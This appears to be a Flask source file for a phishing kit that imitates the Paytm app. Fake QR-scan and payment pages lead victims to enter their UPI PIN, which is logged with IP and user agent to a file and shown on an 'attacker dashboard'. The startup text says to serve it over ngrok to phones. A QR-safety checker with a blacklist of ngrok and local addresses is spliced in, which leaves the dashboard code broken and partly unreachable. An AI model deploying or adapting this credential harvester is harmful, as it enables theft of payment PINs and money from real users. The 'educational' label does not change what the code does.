from flask import Flask, render_template, request, redirect, make_response, session, jsonify, url_for
from datetime import datetime
import os
import json
import uuid
import random

app = Flask(__name__)
app.secret_key = "paytm_demo_educational_2024"
app.permanent_session_lifetime = 3600

# File to store captured credentials
LOG_FILE = "captured_data.txt"

# Store user data for demo
user_data = {
    'name': 'User',
    'phone': '9876543210',
    'email': 'user@gmail.com',
    'balance': 42580,
    'account_number': 'XXXX-XXXX-1234',
    'upi_id': 'user@paytm'
}

# Store transaction history
transaction_history = [
    {'id': 1, 'type': 'sent', 'to': 'Mobile Recharge', 'amount': 299, 'date': 'Today, 10:30 AM', 'status': 'Success'},
    {'id': 2, 'type': 'sent', 'to': 'Electricity Bill', 'amount': 1540, 'date': 'Yesterday, 6:15 PM', 'status': 'Success'},
    {'id': 3, 'type': 'received', 'from': 'Rahul Sharma', 'amount': 5000, 'date': '2 days ago', 'status': 'Success'},
    {'id': 4, 'type': 'sent', 'to': 'Quick Mart', 'amount': 350, 'date': '3 days ago', 'status': 'Success'},
    {'id': 5, 'type': 'sent', 'to': 'Zomato', 'amount': 450, 'date': '4 days ago', 'status': 'Success'},
]

def format_amount(amount):
    """Format amount with commas"""
    return f"{amount:,}"

def log_capture(data, data_type, ip_address, user_agent):
    """Log captured payment and UPI data"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"""
{'='*70}
[+] TIMESTAMP: {timestamp}
[+] IP ADDRESS: {ip_address}
[+] USER AGENT: {user_agent}
[+] TYPE: {data_type}
[+] DATA: {json.dumps(data, indent=2)}
{'='*70}
"""
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    
    print(f"\n{'='*70}")
    print(f"[!] {data_type} CAPTURED!")
    print(f"[!] Time: {timestamp}")
    print(f"[!] Data: {json.dumps(data, indent=2)}")
    print(f"{'='*70}\n")

@app.route('/')
def index():
    """Main Paytm home screen"""
    return render_template('index.html', user=user_data, transactions=transaction_history[:3], format_amount=format_amount)

@app.route('/qr-scanner')
def qr_scanner():
    """QR Scanner page with camera access"""
    return render_template('qr_scanner.html')

@app.route('/scan-complete')
def scan_complete():
    """After QR is scanned - Open payment page"""
    transaction_id = str(uuid.uuid4())[:8]
    session['transaction_id'] = transaction_id
    
    # Merchant details
    merchant_data = {
        'name': 'Merchant Account',
        'bank': 'Paytm Payments Bank',
        'account': '9876',
        'upi_id': 'merchant@paytm',
        'merchant_type': 'Verified Merchant',
        'category': 'Shopping'
    }
    session['merchant'] = merchant_data
    
    return redirect(url_for('payment_page'))

@app.route('/payment-page')
def payment_page():
    """Payment page with amount input"""
    merchant = session.get('merchant', {})
    return render_template('payment_page.html', merchant=merchant, user=user_data, format_amount=format_amount)

@app.route('/process-payment', methods=['POST'])
def process_payment():
    """Process payment and go to PIN entry"""
    amount = request.form.get('amount')
    note = request.form.get('note', '')
    
    session['payment_amount'] = amount
    session['payment_note'] = note
    
    log_capture({
        'amount': amount,
        'note': note,
        'merchant': session.get('merchant', {})
    }, 'AMOUNT_ENTERED', request.remote_addr, request.headers.get('User-Agent'))
    
    return redirect(url_for('upi_pin'))

@app.route('/upi-pin')
def upi_pin():
    """UPI PIN entry screen"""
    amount = session.get('payment_amount', '0')
    merchant = session.get('merchant', {})
    return render_template('upi_pin.html', amount=amount, merchant=merchant, user=user_data)

@app.route('/verify-pin', methods=['POST'])
def verify_pin():
    """Capture UPI PIN"""
    data = request.get_json()
    pin = data.get('pin')
    
    captured_data = {
        'upi_pin': pin,
        'amount': session.get('payment_amount'),
        'note': session.get('payment_note'),
        'merchant': session.get('merchant'),
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    log_capture(captured_data, 'UPI_PIN_CAPTURED', request.remote_addr, request.headers.get('User-Agent'))
    
    transaction_ref = f"4416342{datetime.now().strftime('%H%M%S')}{random.randint(1000,9999)}"
    
    resp = make_response(jsonify({
        'status': 'success',
        'transaction_ref': transaction_ref,
        'redirect': url_for('payment_success')
    }))
    
    resp.set_cookie('paytm_session', f"SESS_{uuid.uuid4().hex}", httponly=False)
    
    return resp

@app.route('/payment-success')
def payment_success():
    """Payment success screen"""
    amount = session.get('payment_amount', '500')
    merchant = session.get('merchant', {})
    transaction_ref = f"4416342{datetime.now().strftime('%H%M%S')}52587"
    
    # Update balance (just for demo)
    user_data['balance'] -= int(amount) if amount.isdigit() else 0
    
    return render_template('payment_success.html', 
                         amount=amount, 
                         merchant=merchant,
                         user=user_data,
                         transaction_ref=transaction_ref,
                         time=datetime.now().strftime("%d %b %Y, %I:%M %p"),
                         format_amount=format_amount)

@app.route('/balance-history')
def balance_history():
    """Balance and transaction history page"""
    return render_template('balance_history.html', user=user_data, transactions=transaction_history, format_amount=format_amount)

@app.route('/offers')
def offers():
    """Offers and rewards page"""
    offers_list = [
        {'title': 'Get 10% Cashback', 'desc': 'On first transaction', 'code': 'FIRST10'},
        {'title': 'Free Shipping', 'desc': 'On orders above ₹499', 'code': 'FREESHIP'},
        {'title': 'Paytm Postpaid', 'desc': 'Get up to ₹60,000 credit', 'code': 'ACTIVATE'},
        {'title': 'Bus Tickets', 'desc': 'Get 15% OFF on first booking', 'code': 'BUS15'},
    ]
    return render_template('offers.html', offers=offers_list)

@app.route('/pay-anyone')
def pay_anyone():
    """Pay to mobile number or contact"""
    return render_template('pay_anyone.html', user=user_data)

@app.route('/bank-transfer')
def bank_transfer():
    """Bank transfer page"""
    return render_template('bank_transfer.html', user=user_data)

@app.route('/mobile-recharge')
def mobile_recharge():
    """Mobile recharge page"""
    return render_template('mobile_recharge.html', user=user_data)

@app.route('/fastag-recharge')
def fastag_recharge():
    """FASTag recharge page"""
    return render_template('fastag_recharge.html', user=user_data)

@app.route('/loan-emi')
def loan_emi():
    """Loan EMI payment page"""
    return render_template('loan_emi.html', user=user_data)

@app.route('/shopping')
def shopping():
    """Shopping page"""
    return render_template('shopping.html', user=user_data)

@app.route('/credit-card')
def credit_card():
    """Credit card page"""
    return render_template('credit_card.html', user=user_data)

@app.route('/loan')
def loan():
    """Loan page"""
    return render_template('loan.html', user=user_data)

@app.route('/electricity-bill')
def electricity_bill():
    """Electricity bill payment"""
    return render_template('electricity_bill.html', user=user_data)

@app.route('/profile')
def profile():
    """Profile page"""
    return render_template('profile.html', user=user_data)

@app.route('/attacker-dashboard')
def attacker_dashboard():
    """Attacker dashboard to view captured data"""
    if not os.path.exists(LOG_FILE):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Attacker Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                h1 { color: #ff4444; border-bottom: 2px solid #ff4444; padding-bottom: 10px; margin-bottom: 20px; }
                .empty { background: #111; padding: 60px; text-align: center; border: 1px solid #00ff00; border-radius: 10px; }
                .refresh { background: #00ff00; color: #000; padding: 10px 20px; text-decoration: none; display: inline-block; margin-top: 20px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔓 ATTACKER DASHBOARD</h1>
                <div class="empty">
                    <h3>📱 No Data Captured Yet</h3>
                    <p>Waiting for victim to scan QR and enter UPI PIN...</p>
                    <a href="/attacker-dashboard" class="refresh">🔄 Refresh</a>
                </div>
            </div>
        </body>
        </html>
        """
    
    # Add after your existing routes

# QR Security Checker - Protection Mechanism
QR_BLACKLIST = [
    'payment-page',
    'upi-pin', 
    'verify-pin',
    'localhost',
    '192.168.',
    'ngrok',
    'paytm-quishing'
]

@app.route('/secure-scan')
def secure_scan():
    """Protected QR Scanner that alerts users of phishing attempts"""
    return render_template('secure_scan.html')

@app.route('/analyze-qr', methods=['POST'])
def analyze_qr():
    """Analyze QR code for security threats"""
    data = request.get_json()
    qr_url = data.get('qr_url', '')
    
    # Security analysis
    is_suspicious = False
    warnings = []
    risk_level = "low"
    
    # Check for suspicious patterns
    if 'payment-page' in qr_url or 'upi-pin' in qr_url:
        is_suspicious = True
        warnings.append("⚠️ This QR code leads to a payment page - Always verify the URL before entering credentials")
        risk_level = "high"
    
    if 'localhost' in qr_url or '192.168.' in qr_url:
        is_suspicious = True
        warnings.append("⚠️ This QR points to a local server address - Legitimate payment QR codes never use local IPs")
        risk_level = "critical"
    
    if 'ngrok' in qr_url:
        is_suspicious = True
        warnings.append("⚠️ Suspicious: This QR uses ngrok tunnel - Often used in phishing attacks")
        risk_level = "high"
    
    if not qr_url.startswith('https://paytm.com') and not qr_url.startswith('https://paytm.in'):
        is_suspicious = True
        warnings.append("⚠️ This is NOT an official Paytm URL. Legitimate Paytm QR codes start with https://paytm.com")
        risk_level = "high"
    
    # Check if it's asking for payment
    if 'pay' in qr_url.lower() or 'payment' in qr_url.lower():
        warnings.append("⚠️ This QR code requests payment - Always verify the merchant name before paying")
    
    # If no suspicious patterns found, it's safe
    if not is_suspicious:
        warnings.append("✅ This QR code appears legitimate. Always verify the URL before proceeding.")
        risk_level = "safe"
    
    return jsonify({
        'is_suspicious': is_suspicious,
        'warnings': warnings,
        'risk_level': risk_level,
        'analyzed_url': qr_url
    })

@app.route('/report-phishing', methods=['POST'])
def report_phishing():
    """Report a phishing QR code"""
    data = request.get_json()
    reported_url = data.get('reported_url', '')
    
    # Log the reported phishing attempt
    log_capture({
        'reported_url': reported_url,
        'report_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'reporter_ip': request.remote_addr
    }, 'PHISHING_REPORT', request.remote_addr, request.headers.get('User-Agent'))
    
    return jsonify({'status': 'reported', 'message': 'Thank you for reporting! This helps protect other users.'})
    
    with open(LOG_FILE, 'r') as f:
        data = f.read()
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attacker Dashboard - Captured Paytm Data</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
            .container {{ max-width: 1400px; margin: 0 auto; }}
            h1 {{ color: #ff4444; border-bottom: 2px solid #ff4444; padding-bottom: 10px; margin-bottom: 20px; }}
            .stats {{ background: #111; padding: 20px; border: 1px solid #00ff00; margin-bottom: 20px; border-radius: 10px; }}
            pre {{ background: #111; padding: 20px; border: 1px solid #00ff00; overflow-x: auto; white-space: pre-wrap; max-height: 500px; overflow-y: auto; border-radius: 10px; }}
            .refresh {{ background: #00ff00; color: #000; padding: 10px 20px; text-decoration: none; display: inline-block; margin-bottom: 20px; border-radius: 5px; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔓 CAPTURED UPI DATA</h1>
            <a href="/attacker-dashboard" class="refresh">🔄 Refresh</a>
            <div class="stats">
                <strong>⚠️ EDUCATIONAL DEMO ONLY</strong><br>
                This shows captured UPI PINs and transaction details
            </div>
            <pre>{data}</pre>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    import socket
    hostname = socket.gethostbyname(socket.gethostname())
    
    print("\n" + "="*70)
    print("🔥 PAYTM DEMO - ENHANCED VERSION")
    print("="*70)
    print(f"\n📱 ON IPHONE - CHROME:")
    print(f"   1. Open Chrome")
    print(f"   2. Go to your ngrok HTTPS URL")
    print(f"   3. Add to Home Screen for best experience")
    print(f"\n💻 ON LAPTOP:")
    print(f"   Attacker Dashboard: http://localhost:5000/attacker-dashboard")
    print("\n" + "="*70)
    
    app.run(host='0.0.0.0', port=5000, debug=True)